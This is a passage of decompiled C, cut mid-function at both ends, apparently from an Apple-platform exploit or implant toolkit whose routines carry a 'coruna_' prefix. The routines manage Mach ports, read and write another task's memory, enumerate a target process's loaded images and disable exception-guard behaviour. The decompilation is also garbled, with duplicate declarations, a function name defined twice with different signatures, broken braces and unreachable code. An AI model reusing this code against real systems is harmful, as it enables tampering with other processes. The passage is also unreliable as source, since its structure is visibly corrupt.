      lk2 = _mach_port_deallocate(*(ipc_space_t *)k_persist_mach_task_self_slot,*arg);
      port = (uint)type_id;
      version = 0x1e024;
      if (port != 0) {
        version = port;
      }
      if (lk2 != 0) {
        port = version;
      }
      lk2 = _mach_port_mod_refs(*(ipc_space_t *)data,*arg,1,-1);
      version = 0x1e024;
      if (port != 0) {
        version = port;
      }
      if (lk2 != 0) {
        port = version;
      }
      type_id = (unsigned long)port;
    }
    if ((*(long *)(arg + 6) != 0) && (*(long *)(arg + 8) != 0)) {
      version = (**(void (**)(*(long *)(arg + 6) + 0x20))();
      if ((uint)type_id != 0) {
        version = (uint)type_id;
      }
      type_id = (unsigned long)version;
    }
    arg[6] = 0;
    arg[7] = 0;
    arg[4] = 0;
    arg[5] = 0;
    arg[10] = 0;
    arg[0xb] = 0;
    arg[8] = 0;
    arg[9] = 0;
    arg[2] = 0;
    arg[3] = 0;
    arg[0] = 0;
    arg[1] = 0;
    _free(arg);
  }
  return type_id;
}





uint64_t coruna_pthread_join(long handle)
{
  int err;
  uint64_t u;
  void *scratch;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else if (*(char *)(handle + 8) == '\0') {
    u = 0;
  }
  else {
    *(uint8_t *)(handle + 9) = 1;
    if (*(long *)(handle + 0x18) != 0) {
      coruna_mach_msg_destroy(handle);
      scratch = (void *)0x0;
      err = _pthread_join(*(pthread_t *)(handle + 0x10),&scratch);
      if (err == 0) {
        coruna_mach_msg_destroy(handle);
      }
      else {
        ___error();
      }
      *(uint64_t *)(handle + 0x10) = 0;
    }
    u = 0;
    *(uint8_t *)(handle + 8) = 0;
  }
  return u;
}





unsigned long coruna_mach_port_create(uint64_t *arg,long val)

{
  uint8_t *data;
  mach_port_name_t name;
  uint size;
  kern_return_t lk3;
  mach_port_name_t lm4;
  int i;
  mach_port_name_t *lpm6;
  unsigned long kind;
  uint64_t cache_78;
  mach_port_name_t cache_79 [2];
  
  if (arg == (uint64_t *)0x0) {
    return 0xad001;
  }
  lpm6 = _calloc(1,0x30);
  if (lpm6 == (mach_port_name_t *)0x0) {
    return 0xad009;
  }
  cache_78 = 0;
  if (val == 0) {
    kind = 0;
    *arg = lpm6;
  }
  else {
    kind = (**(void (**)(val + 0x18))(val,0,&cache_78);
    data = k_persist_mach_task_self_slot;
    if ((int)kind == 0) {
      cache_79[0] = 0;
      size = _mach_port_allocate(*(ipc_space_t *)k_persist_mach_task_self_slot,1,cache_79);
      name = cache_79[0];
      if (size == 0) {
        cache_79[0] = 1;
        lk3 = _mach_port_set_attributes
                          (*(ipc_space_t *)data,name,1,(mach_port_info_t)cache_79,1);
        if ((lk3 == 0) &&
           (lk3 = _mach_port_insert_right(*(ipc_space_t *)data,name,name,0x14), lk3 == 0)) {
          *lpm6 = name;
          lm4 = coruna_srandomdev();
          lpm6[1] = lm4;
          *(uint16_t *)(lpm6 + 2) = 0x100;
          lpm6[4] = 0;
          lpm6[5] = 0;
          *(long *)(lpm6 + 6) = val;
          *(uint64_t *)(lpm6 + 8) = cache_78;
          i = coruna_mach_msg_destroy(lpm6);
          if (i == 0) {
            kind = 0;
            *arg = lpm6;
            return kind;
          }
          _mach_port_mod_refs(*(ipc_space_t *)data,name,0,-1);
        }
        _mach_port_destroy(*(ipc_space_t *)data,name);
        size = 0x1e023;
      }
      else {
        size = size | 0x80000000;
      }
      kind = (unsigned long)size;
      (**(void (**)(val + 0x20))(val,cache_78);
    }
    _free(lpm6);
  }
  return kind;
}





uint coruna_srandomdev(void)
{
  uint u;
  unsigned long size;
  
  _srandomdev();
  size = _random();
  u = (uint)size;
  if ((size & 0x7fffffff) == 0) {
    size = _random();
    u = (int)k_persist_dlsym_slot << 0xe ^ 0x3912;
    if ((size & 0x7fffffff) != 0) {
      u = (uint)size;
    }
  }
  return u & 0x7fffffff;
}





uint32_t coruna_mach_msg_destroy(mach_port_t *port)
{
  mach_msg_return_t lm1;
  mach_msg_header_t scratch;
  
  if (port == (mach_port_t *)0x0) {
    return 0xad001;
  }
  if (*(long *)(port + 6) != 0) {
    scratch.msgh_local_port = 0;
    scratch.msgh_reserved = 0;
    scratch.msgh_remote_port = *port;
    scratch.msgh_id = port[1];
    scratch = k_persist_rodata_word_1efb8;
    lm1 = _mach_msg(&scratch,0x11,0x18,0,0,1,0);
    if (lm1 == 0) {
      return 0;
    }
    if (lm1 != 0x10000004) {
      return 0x1e025;
    }
    _mach_msg_destroy(&scratch);
  }
  return 0;
}





uint64_t coruna_pthread_create(uint32_t *size,uint32_t *flags_2,uint32_t *version_3)
{
  int err;
  uint64_t u;
  
  if (size == (uint32_t *)0x0) {
    u = 0xad001;
  }
  else if (((*(char *)(size + 2) == '\0') &&
           (*(uint16_t *)(size + 2) = 1, *(long *)(size + 6) != 0)) &&
          (err = _pthread_create((pthread_t *)(size + 4),(pthread_attr_t *)0x0,
                                   (void **)coruna_mach_msg,size), err != 0)) {
    ___error();
    *(uint8_t *)(size + 2) = 0;
    *(uint64_t *)(size + 4) = 0;
    u = 0x1e01f;
  }
  else {
    if (flags_2 != (uint32_t *)0x0) {
      *flags_2 = *size;
    }
    u = 0;
    if (version_3 != (uint32_t *)0x0) {
      *version_3 = size[1];
    }
  }
  return u;
}





uint64_t coruna_mach_msg(mach_port_name_t *arg)
{
  size_t ls1;
  mach_port_name_t rcv_name;
  mach_msg_return_t lm2;
  int err;
  mach_msg_header_t *msg;
  mach_msg_header_t *msg_00;
  
  if ((arg != (mach_port_name_t *)0x0) &&
     (msg = _calloc(1,0x13c), msg != (mach_msg_header_t *)0x0)) {
    do {
      while( true ) {
        if ((*(char *)((long)arg + 9) != '\0') || (rcv_name = *arg, rcv_name + 1 < 2))
        goto fail;
        msg[0xb].msgh_reserved = 0;
        msg[0xb].msgh_id = 0;
        msg[0xb].msgh_remote_port = 0;
        msg[0xb].msgh_local_port = 0;
        msg[0xc].msgh_remote_port = 0;
        msg[0xc].msgh_local_port = 0;
        msg[0xc].msgh_bits = 0;
        msg[0xc].msgh_size = 0;
        msg[10].msgh_remote_port = 0;
        msg[10].msgh_local_port = 0;
        msg[10].msgh_bits = 0;
        msg[10].msgh_size = 0;
        msg[0xb].msgh_bits = 0;
        msg[0xb].msgh_size = 0;
        msg[10].msgh_reserved = 0;
        msg[10].msgh_id = 0;
        msg[9].msgh_bits = 0;
        msg[9].msgh_size = 0;
        msg[8].msgh_reserved = 0;
        msg[8].msgh_id = 0;
        msg[9].msgh_reserved = 0;
        msg[9].msgh_id = 0;
        msg[9].msgh_remote_port = 0;
        msg[9].msgh_local_port = 0;
        msg[7].msgh_reserved = 0;
        msg[7].msgh_id = 0;
        msg[7].msgh_remote_port = 0;
        msg[7].msgh_local_port = 0;
        msg[8].msgh_remote_port = 0;
        msg[8].msgh_local_port = 0;
        msg[8].msgh_bits = 0;
        msg[8].msgh_size = 0;
        msg[6].msgh_remote_port = 0;
        msg[6].msgh_local_port = 0;
        msg[6].msgh_bits = 0;
        msg[6].msgh_size = 0;
        msg[7].msgh_bits = 0;
        msg[7].msgh_size = 0;
        msg[6].msgh_reserved = 0;
        msg[6].msgh_id = 0;
        msg[5].msgh_bits = 0;
        msg[5].msgh_size = 0;
        msg[4].msgh_reserved = 0;
        msg[4].msgh_id = 0;
        msg[5].msgh_reserved = 0;
        msg[5].msgh_id = 0;
        msg[5].msgh_remote_port = 0;
        msg[5].msgh_local_port = 0;
        msg[3].msgh_reserved = 0;
        msg[3].msgh_id = 0;
        msg[3].msgh_remote_port = 0;
        msg[3].msgh_local_port = 0;
        msg[4].msgh_remote_port = 0;
        msg[4].msgh_local_port = 0;
        msg[4].msgh_bits = 0;
        msg[4].msgh_size = 0;
        msg[2].msgh_remote_port = 0;
        msg[2].msgh_local_port = 0;
        msg[2].msgh_bits = 0;
        msg[2].msgh_size = 0;
        msg[3].msgh_bits = 0;
        msg[3].msgh_size = 0;
        msg[2].msgh_reserved = 0;
        msg[2].msgh_id = 0;
        msg[1].msgh_bits = 0;
        msg[1].msgh_size = 0;
        msg->msgh_reserved = 0;
        msg->msgh_id = 0;
        msg[1].msgh_reserved = 0;
        msg[1].msgh_id = 0;
        msg[1].msgh_remote_port = 0;
        msg[1].msgh_local_port = 0;
        msg->msgh_remote_port = 0;
        msg->msgh_local_port = 0;
        msg->msgh_bits = 0;
        msg->msgh_size = 0;
        *(uint64_t *)&msg[0xc].msgh_id = 0;
        msg[0xc].msgh_local_port = 0;
        msg[0xc].msgh_reserved = 0;
        lm2 = _mach_msg(msg,0x106,0,0x13c,rcv_name,10000,0);
        if (lm2 == 0x10004004) break;
        if (lm2 == 0) {
          coruna_port_get_refs(arg,msg,0x13c);
          lm2 = 0;
        }
done:
        err = coruna_mach_msg_destroy(lm2,msg,0x13c);
        if (err != 0) goto fail;
      }
      if (0x1fffe8 < msg->msgh_size - 0x18) {
        lm2 = _mach_msg(msg,2,0,0x13c,*arg,0,0);
        goto done;
      }
      ls1 = (unsigned long)msg->msgh_size + 8;
      msg_00 = _calloc(1,ls1);
      if (msg_00 == (mach_msg_header_t *)0x0) break;
      lm2 = _mach_msg(msg_00,2,0,(mach_msg_size_t)ls1,*arg,0,0);
      if (lm2 == 0) {
        coruna_port_get_refs(arg,msg_00,ls1);
        lm2 = 0;
      }
      err = coruna_mach_msg_destroy(lm2,msg_00,ls1);
      _free(msg_00);
    } while (err == 0);
fail:
    _free(msg);
  }
  return 0;
}





void coruna_port_get_refs(long handle,int *flags,uint size)
{
  long handle;
  uint u;
  int err;
  uint size;
  mach_port_urefs_t lm5;
  kern_return_t lk6;
  mach_port_urefs_t lm7;
  int status;
  uint version;
  mach_port_urefs_t *lpm10;
  mach_port_urefs_t scratch;
  uint bootargs;
  
  if (((handle != 0) && (flags != (int *)0x0)) && (0x17 < size)) {
    err = flags[5];
    size = *(uint *)(handle + 4);
    if ((unsigned long)size <= (unsigned long)(long)err && (unsigned long)(long)err < (unsigned long)size + 0xc) {
      u = flags[1];
      version = 0x18;
      if (*flags < 0) {
        version = 0x2c;
      }
      if (version <= u && u < size) {
        if (*flags < 0) {
          if (flags[6] != 1) {
            return;
          }
          lpm10 = *(mach_port_urefs_t **)(flags + 7);
          if ((uint)flags[9] >> 0x18 == 0) {
            if ((mach_port_name_t)lpm10 + 1 < 2) {
              return;
            }
            scratch = 0;
            lk6 = _mach_port_get_refs(*(ipc_space_t *)k_persist_mach_task_self_slot,
                                        (mach_port_name_t)lpm10,0,&scratch);
            if (lk6 != 0) {
              return;
            }
            if (scratch == 0) {
              return;
            }
          }
          else {
            if ((uint)flags[9] >> 0x18 != 1) {
              return;
            }
            if (lpm10 == (mach_port_urefs_t *)0x0) {
              return;
            }
            if (flags[10] != 4) {
              return;
            }
            lm5 = *lpm10;
            lm7 = _getpid();
            if (lm5 == lm7) {
              lpm10 = (mach_port_urefs_t *)(unsigned long)*(uint *)k_persist_mach_task_self_slot;
            }
            else {
              if ((*(mach_port_urefs_t *)(handle + 0x28) == lm5) &&
                 (1 < *(mach_port_name_t *)(handle + 0x2c) + 1)) {
                scratch = 0;
                lk6 = _mach_port_get_refs(*(ipc_space_t *)k_persist_mach_task_self_slot,
                                            *(mach_port_name_t *)(handle + 0x2c),0,&scratch);
                lpm10 = (mach_port_urefs_t *)0x0;
                status = 0x1e020;
                if ((lk6 == 0) && (scratch != 0)) {
                  status = 0;
                  lpm10 = (mach_port_urefs_t *)(unsigned long)*(uint *)(handle + 0x2c);
                }
              }
              else {
                bootargs = 0;
                scratch = lm5;
                status = (**(void (**)(*(long *)(handle + 0x18) + 0x28))
                                  (*(long *)(handle + 0x18),*(uint64_t *)(handle + 0x20),
                                   0xc000001d,&scratch);
                lpm10 = (mach_port_urefs_t *)0x0;
                if (status == 0) {
                  lpm10 = (mach_port_urefs_t *)(unsigned long)bootargs;
                  *(mach_port_urefs_t *)(handle + 0x28) = lm5;
                  *(uint *)(handle + 0x2c) = bootargs;
                }
              }
              if (status != 0) {
                return;
              }
            }
          }
        }
        else {
          lpm10 = (mach_port_urefs_t *)0x0;
        }
        handle = 0;
        if (u - version != 0) {
          handle = (long)flags + (unsigned long)version;
        }
        coruna_mach_msg_dcc0(handle,err - size,handle,u - version,lpm10,flags[2]);
      }
    }
  }
  return;
}





uint64_t coruna_mach_msg_destroy(int flags,mach_msg_header_t *arg,uint size)
{
  uint u;
  uint size;
  uint64_t version;
  
  if (arg == (mach_msg_header_t *)0x0) {
    return 0xad001;
  }
  if (size == 0) {
    return 0xad001;
  }
  u = flags + 0xefffbffe;
  if (u < 0xb) {
    size = 1 << (unsigned long)(u & 0x1f);
    if ((size & 0x22e) == 0) {
      if ((size & 0x91) != 0) {
        version = 0x1e01b;
        _bzero(arg,(unsigned long)size);
        return version;
      }
      if (flags != 0) {
      version = 0x1e021;
      _bzero(arg,(unsigned long)size);
      return version;
      }
      goto cleanup;
    }
  }
  else {
done:
    if (flags != 0) {
      version = 0x1e021;
      _bzero(arg,(unsigned long)size);
      return version;
    }
cleanup:
    arg->msgh_remote_port = 0;
    _mach_msg_destroy(arg);
  }
  version = 0;
fail:
  _bzero(arg,(unsigned long)size);
  return version;
}





uint coruna_task_exc_guard(uint64_t val)
{
  uint u;
  uint size;
  uint scratch;
  
  u = 0xad001;
  if ((1 < (int)val + 1U) &&
     (u = 0,
     k_persist_task_get_exc_guard_behavior_slot != (uint8_t *)0x0 &&
     k_persist_task_set_exc_guard_behavior_slot != (uint8_t *)0x0)) {
    scratch = 0;
    u = _task_get_exc_guard_behavior(val,&scratch);
    if (u == 0) {
      if ((scratch & 0x88) == 0) {
        u = 0;
      }
      else {
        scratch = scratch & 0xffffff77;
        size = _task_set_exc_guard_behavior(val);
        u = 0;
        if (size != 0) {
          u = size | 0x80000000;
        }
      }
    }
    else {
      u = u | 0x80000000;
    }
  }
  return u;
}





uint32_t coruna_port_kernel_object(uint64_t val)
{
  mach_port_name_t name;
  bool err;
  ipc_space_t task;
  kern_return_t lk2;
  long handle;
  mach_msg_type_number_t lm4;
  uint32_t u;
  int err;
  uint size;
  unsigned long version;
  uint scratch;
  uint bootargs;
  mach_msg_type_number_t thread_attr;
  ipc_info_tree_name_array_t host_info;
  mach_msg_type_number_t serial_buf;
  ipc_info_name_array_t action;
  ipc_info_space_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  kern_return_t path_buf;
  
  u = 0xad025;
  task = (ipc_space_t)val;
  if (task + 1 < 2) {
    u = 0xad001;
  }
  else {
    path_buf = 5;
    stack_guard = 0;
    sa_saved = 0;
    sa_new = 0;
    err = 0x19;
    do {
      handle = __dyld_process_info_create(val,0,&path_buf);
      if (handle != 0) {
        sa_saved = 0;
        stack_guard = 0;
        sa_new = 0xff;
        __dyld_process_info_get_state(handle,&stack_guard);
        size = (uint)(byte)sa_new;
        if (size - 0x30 < 0x21) {
          __dyld_process_info_release(handle);
          return 0;
        }
        __dyld_process_info_release(handle);
        if (size == 0) {
          return 0xad025;
        }
        break;
      }
      _usleep(100000);
      err = err + -1;
    } while (err != 0);
    block_ctx.iis_genno_mask = 0;
    block_ctx.iis_table_size = 0;
    block_ctx.iis_table_next = 0;
    block_ctx.iis_tree_size = 0;
    block_ctx.iis_tree_small = 0;
    block_ctx.iis_tree_hash = 0;
    action = (ipc_info_name_array_t)0x0;
    serial_buf = 0;
    host_info = (ipc_info_tree_name_array_t)0x0;
    thread_attr = 0;
    lk2 = _mach_port_space_info(task,&block_ctx,&action,&serial_buf,&host_info,&thread_attr);
    if (lk2 == 0) {
      path_buf = 0;
      if (serial_buf != 0) {
        handle = 0;
        err = false;
        version = 1;
        lm4 = serial_buf;
        do {
          scratch = 0;
          bootargs = 0;
          name = *(mach_port_name_t *)((long)&action->iin_name + handle);
          if (1 < name + 1) {
            path_buf = _mach_port_kernel_object(task,name,&bootargs,&scratch);
            err = (bool)((path_buf == 0 && bootargs == 0x19) | err);
            lm4 = serial_buf;
          }
          if (lm4 <= version) break;
          version = version + 1;
          handle = handle + 0x1c;
        } while (!err);
        u = 0;
        if (!err) {
          u = 0xad025;
        }
        if ((action != (ipc_info_name_array_t)0x0) && (lm4 != 0)) {
          _mach_vm_deallocate(*(vm_map_t *)k_persist_mach_task_self_slot,(mach_vm_address_t)action
                              ,(unsigned long)lm4 * 0x1c);
        }
      }
      if ((host_info != (ipc_info_tree_name_array_t)0x0) && (thread_attr != 0)) {
        _mach_vm_deallocate(*(vm_map_t *)k_persist_mach_task_self_slot,(mach_vm_address_t)host_info,
                            (unsigned long)thread_attr * 0x24);
      }
    }
  }
  return u;
}





uint64_t
uint64_t coruna_mach_vm_allocate(uint64_t val,mach_vm_size_t arg,int flags,mach_vm_address_t *arg_x)
{
  vm_map_t target;
  kern_return_t lk1;
  uint64_t u;
  mach_vm_address_t scratch;
  
  u = 0xad001;
  if ((arg_x != (mach_vm_address_t *)0x0) && (arg != 0)) {
    u = 0x1e009;
    target = (vm_map_t)val;
    if (1 < target + 1) {
      scratch = 0;
      lk1 = _mach_vm_allocate(target,&scratch,arg,flags);
      if (lk1 == 0) {
        lk1 = _mach_vm_protect(target,scratch,arg,0,3);
        if (lk1 == 0) {
          u = 0;
          *arg_x = scratch;
        }
        else {
          coruna_mach_vm_deallocate(val,scratch,arg,0);
          u = 0x1e00d;
        }
      }
      else {
        u = 0x1e00a;
      }
    }
  }
  return u;
}





uint32_t coruna_mach_vm_deallocate(uint64_t val,mach_vm_address_t arg,unsigned long arg_x,int flags)
{
  kern_return_t lk1;
  uint32_t u;
  
  if ((arg == 0) && ((int)arg_x != 0)) {
    u = 0xad001;
  }
  else {
    u = 0x1e009;
    if ((1 < (vm_map_t)val + 1) && (u = 0, (int)arg_x != 0)) {
      if (flags != 0) {
        coruna_mach_vm_write(val,arg,arg_x);
      }
      lk1 = _mach_vm_deallocate((vm_map_t)val,arg,arg_x & 0xffffffff);
      u = 0;
      if (lk1 != 0) {
        u = 0x1e00b;
      }
    }
  }
  return u;
}





uint64_t coruna_sysctl_proc_cputype(mach_port_name_t arg,uint32_t *size,uint *size_x)
{
  kern_return_t lk1;
  int err;
  uint u;
  uint64_t *ptr;
  uint64_t size;
  size_t scratch;
  size_t bootargs;
  uint64_t thread_attr;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  int action [14];
  long block_ctx;
  
  block_ctx = *(long *)k_persist_stack_chk_guard_slot;
  serial_buf = 0;
  if (arg + 1 < 2 || size == (uint32_t *)0x0) {
    size = 0xad001;
  }
  else {
    size = 0x1e002;
    lk1 = _pid_for_task(arg,(int *)((long)&serial_buf + 4));
    if (lk1 == 0) {
      host_info = 0;
      scratch = 0;
      thread_attr = 0;
      thread_attr = 0;
      bootargs = 0;
      err = _proc_pidinfo(serial_buf,0x13,0,&thread_attr,8);
      if (err == 8) {
        ptr = &thread_attr;
        u = thread_attr & 0xffffff;
      }
      else {
        action[6] = 0;
        action[7] = 0;
        action[4] = 0;
        action[5] = 0;
        action[10] = 0;
        action[0xb] = 0;
        action[8] = 0;
        action[9] = 0;
        action[2] = 0;
        action[3] = 0;
        action[0] = 0;
        action[1] = 0;
        bootargs = 0xc;
        err = _sysctlnametomib("sysctl.proc_cputype",action,&bootargs);
        if (*(long *)k_persist_stack_chk_guard_slot == block_ctx) {
        return size;
        }
        ___stack_chk_fail();
        action[bootargs] = serial_buf;
        bootargs = bootargs + 1;
        scratch = 4;
        err = _sysctl(action,(u_int)bootargs,&serial_buf,&scratch,(void *)0x0,0);
        if (*(long *)k_persist_stack_chk_guard_slot == block_ctx) {
        return size;
        }
        ___stack_chk_fail();
        u = 0;
        ptr = &serial_buf;
      }
      *size = *(uint32_t *)ptr;
      size = 0;
      if (size_x != (uint *)0x0) {
        *size_x = u;
      }
    }
  }
fail:
  if (*(long *)k_persist_stack_chk_guard_slot == block_ctx) {
    return size;
  }
  ___stack_chk_fail();
}





uint64_t coruna_mach_vm_read_overwrite(uint64_t val,long *handle,uint64_t id_2)
{
  bool err;
  task_name_t target_task;
  long handle;
  uint64_t u;
  long addr;
  bool status;
  mach_vm_size_t scratch;
  mach_msg_type_number_t bootargs;
  mach_vm_address_t thread_attr [2];
  uint32_t host_info;
  kern_return_t serial_buf;
  uint64_t action;
  uint64_t scratch;
  long block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t sa_new;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t path_buf;
  uint64_t stack_guard;
  uint64_t tmp_buf;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t region;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t plist;
  long plist;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t url_buf;
  uint64_t work;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t json_buf;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t frame;
  uint64_t cache_24;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t work;
  uint64_t cache_27;
  uint64_t cache_28;
  uint64_t cache_29;
  uint64_t cache;
  uint64_t cache_30;
  uint64_t cache_31;
  uint64_t cache_32;
  long cache_20;
  
  cache_20 = *(long *)k_persist_stack_chk_guard_slot;
  u = 0xad001;
  target_task = (task_name_t)val;
  if (*(long *)k_persist_stack_chk_guard_slot == cache_20) {
  return u;
  }
  ___stack_chk_fail();
  thread_attr[0] = 0;
  thread_attr[1] = 0;
  host_info = 0;
  bootargs = 5;
  serial_buf = _task_info(target_task,0x11,(task_info_t)thread_attr,&bootargs);
  if ((serial_buf == 0) && (thread_attr[0] != 0)) {
    cache_30 = 0;
    cache = 0;
    cache_32 = 0;
    cache_31 = 0;
    cache_27 = 0;
    work = 0;
    cache_29 = 0;
    cache_28 = 0;
    cache_24 = 0;
    frame = 0;
    cache_26 = 0;
    cache_25 = 0;
    cache_21 = 0;
    json_buf = 0;
    cache_23 = 0;
    cache_22 = 0;
    work = 0;
    url_buf = 0;
    cache_20 = 0;
    cache = 0;
    url_buf = 0;
    plist = 0;
    frame = 0;
    json_buf = 0;
    tmp_buf = 0;
    region = 0;
    plist = 0;
    region = 0;
    sa_saved = 0;
    tmp_buf = 0;
    path_buf = 0;
    sa_new = 0;
    stack_guard = 0;
    path_buf = 0;
    serial_buf = 0;
    sa_new = 0;
    block_ctx = 0;
    action = 0;
    bootargs = 0;
    sa_saved = 0;
    host_info = 0;
    thread_attr = 0;
    scratch = 0;
    action = 0;
    stack_guard = 0;
    block_ctx = 0;
    scratch = 0;
    serial_buf = _mach_vm_read_overwrite
                          (target_task,thread_attr[0],0x170,(mach_vm_address_t)&action,&scratch);
    handle = __dyld_process_info_create(val,0,&serial_buf);
    if (handle != 0) {
    scratch = 0;
    action = 0;
    stack_guard = 0;
    block_ctx = 0;
    __dyld_process_info_get_cache(handle,&action);
    status = block_ctx != 0 && (char)stack_guard == '\0';
    addr = block_ctx;
    if (block_ctx == 0 || (char)stack_guard != '\0') {
    addr = 0;
    }
    __dyld_process_info_release(handle);
    err = addr == 0;
    u = 0xad022;
    if (*(long *)k_persist_stack_chk_guard_slot == cache_20) {
    return u;
    }
    ___stack_chk_fail();
    status = false;
    }
    u = 0;
    *handle = addr;
    *(bool *)id_2 = status;
    if (*(long *)k_persist_stack_chk_guard_slot == cache_20) {
    return u;
    }
    ___stack_chk_fail();
    status = true;
    addr = plist;
cleanup:
    err = addr == 0;
    u = 0xad022;
    if (*(long *)k_persist_stack_chk_guard_slot == cache_20) {
    return u;
    }
    ___stack_chk_fail();
    status = false;
    }
    u = 0;
    *handle = addr;
    *(bool *)id_2 = status;
    fail:
    if (*(long *)k_persist_stack_chk_guard_slot == cache_20) {
    return u;
  }
  else {
done:
    handle = __dyld_process_info_create(val,0,&serial_buf);
    if (handle != 0) {
      scratch = 0;
      action = 0;
      stack_guard = 0;
      block_ctx = 0;
      __dyld_process_info_get_cache(handle,&action);
      status = block_ctx != 0 && (char)stack_guard == '\0';
      addr = block_ctx;
      if (block_ctx == 0 || (char)stack_guard != '\0') {
        addr = 0;
      }
      __dyld_process_info_release(handle);
      err = addr == 0;
      u = 0xad022;
      if (*(long *)k_persist_stack_chk_guard_slot == cache_20) {
      return u;
      }
      ___stack_chk_fail();
      status = false;
      }
      u = 0;
      *handle = addr;
      *(bool *)id_2 = status;
      fail:
      if (*(long *)k_persist_stack_chk_guard_slot == cache_20) {
      return u;
    }
    status = false;
    addr = 0;
    err = true;
check_ok:
    u = 0xad022;
    if (*(long *)k_persist_stack_chk_guard_slot == cache_20) {
    return u;
    }
    ___stack_chk_fail();
    status = false;
  }
  u = 0;
  *handle = addr;
  *(bool *)id_2 = status;
fail:
  if (*(long *)k_persist_stack_chk_guard_slot == cache_20) {
    return u;
  }
  ___stack_chk_fail();
}





uint64_t coruna_dladdr(uint64_t val,long handle,long *addr_2)
{
  int err;
  uint64_t u;
  long handle;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t *serial_buf;
  uint64_t *action;
  char *block_ctx;
  long stack_guard;
  uint64_t sa_saved;
  uint64_t scratch;
  uint64_t sa_new;
  uint64_t *path_buf;
  uint64_t tmp_buf;
  uint8_t region;
  uint64_t plist;
  uint64_t *url_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint32_t work;
  char *cache;
  long cache_20;
  uint64_t bootargs;
  uint64_t thread_attr;
  
  u = 0xad001;
  if (((1 < (int)val + 1U) && (handle != 0)) && (addr_2 != (long *)0x0)) {
    cache_20 = 0;
    cache = (char *)0x0;
    thread_attr = 0;
    bootargs = 0;
    err = _dladdr(handle,&cache);
    if (err == 0) {
      u = 0xad00b;
    }
    else {
      u = 0xad014;
      if ((cache != (char *)0x0) && (*cache != '\0' && cache_20 != 0)) {
        work = 5;
        handle = __dyld_process_info_create(val,0,&work);
        u = 0xad00b;
        if (handle != 0) {
          action = &plist;
          plist = 0;
          json_buf = k_persist_rodata_word_1ef78;
          frame = 0;
          serial_buf = &sa_new;
          sa_new = 0;
          tmp_buf = k_persist_rodata_word_1ef78;
          region = 0;
          scratch = k_persist_nsconcretestackblock_slot;
          bootargs = k_persist_rodata_word_1ef80;
          thread_attr = coruna_wire_bind_sym;
          host_info = &k_persist_rodata_word_207c8;
          stack_guard = cache_20;
          block_ctx = cache;
          scratch = thread_attr;
          sa_saved = bootargs;
          path_buf = serial_buf;
          url_buf = action;
          __dyld_process_info_for_each_image(handle,&scratch);
          u = 0xad011;
          if ((*(char *)(path_buf + 3) != '\0') && (url_buf[3] != 0)) {
            u = 0;
            *addr_2 = (url_buf[3] + handle) - cache_20;
          }
          __dyld_process_info_release(handle);
          __Block_object_dispose(&sa_new,8);
          __Block_object_dispose(&plist,8);
        }
      }
    }
  }
  return u;
}





void coruna_wire_bind_sym(long handle,uint64_t val,uint64_t id_2,char *path)
{
  int err;
  
  if (((*(char *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18) == '\0' && path != (char *)0x0
       ) && (*path != '\0')) && (err = _strcmp(path,*(char **)(handle + 0x30)), err == 0)
     ) {
    *(uint64_t *)(*(long *)(*(long *)(handle + 0x28) + 8) + 0x18) = val;
    *(uint8_t *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18) = 1;
  }
  return;
}





void coruna_block_assign_243c4(long handle,long addr_2)
{
  void (*ptr)(void);
  unsigned long unaff_x30;
  
  __Block_object_assign((void *)(handle + 0x20),*(void **)(addr_2 + 0x20),8);
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  __Block_object_assign((void *)(handle + 0x28),*(void **)(addr_2 + 0x28),8);
  return;
}





void coruna_driver_copy_port_1918(long handle)
{
  void (*ptr)(void);
  unsigned long unaff_x30;
  
  __Block_object_dispose(*(void **)(handle + 0x28),8);
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  __Block_object_dispose(*(void **)(handle + 0x20),8);
  return;
}





uint64_t coruna_task_dyld_info(task_name_t arg,long handle)
{
  kern_return_t lk1;
  uint64_t u;
  mach_msg_type_number_t scratch;
  long bootargs;
  unsigned long thread_attr;
  uint host_info;
  
  bootargs = 0;
  thread_attr = 0;
  host_info = 0;
  scratch = 5;
  if (handle == 0) {
    u = 0xad001;
  }
  else if (arg + 1 < 2) {
    u = 0x1e009;
  }
  else {
    lk1 = _task_info(arg,0x11,(task_info_t)&bootargs,&scratch);
    u = 0x1e002;
    if ((lk1 == 0) && (scratch == 5)) {
      if ((bootargs == 0) || (0xc800 < thread_attr)) {
        u = 0x1e001;
      }
      else {
        u = 0x1e001;
        if (host_info < 2) {
          u = 0;
          *(bool *)handle = host_info == 1;
          *(bool *)(handle + 1) = host_info == 1;
          *(long *)(handle + 8) = bootargs;
          *(unsigned long *)(handle + 0x10) = thread_attr;
        }
      }
    }
  }
  return u;
}





uint32_t coruna_mach_vm_write(vm_map_t arg,mach_vm_address_t arg_x,uint size)
{
  uint dataCnt;
  kern_return_t lk1;
  void *data;
  uint u;
  uint32_t size;
  int err;
  
  if ((((arg_x != 0) || (size = 0xad001, size == 0)) && (size = 0x1e009, 1 < arg + 1)) &&
     (size = 0, size != 0)) {
    u = size;
    if (0xfff < size) {
      u = 0x1000;
    }
    data = _calloc((unsigned long)size,1);
    if (data == (void *)0x0) {
      size = 0xad009;
    }
    else {
      err = 0;
      do {
        dataCnt = size;
        if (u <= size) {
          dataCnt = u;
        }
        lk1 = _mach_vm_write(arg,arg_x,(vm_offset_t)data,dataCnt);
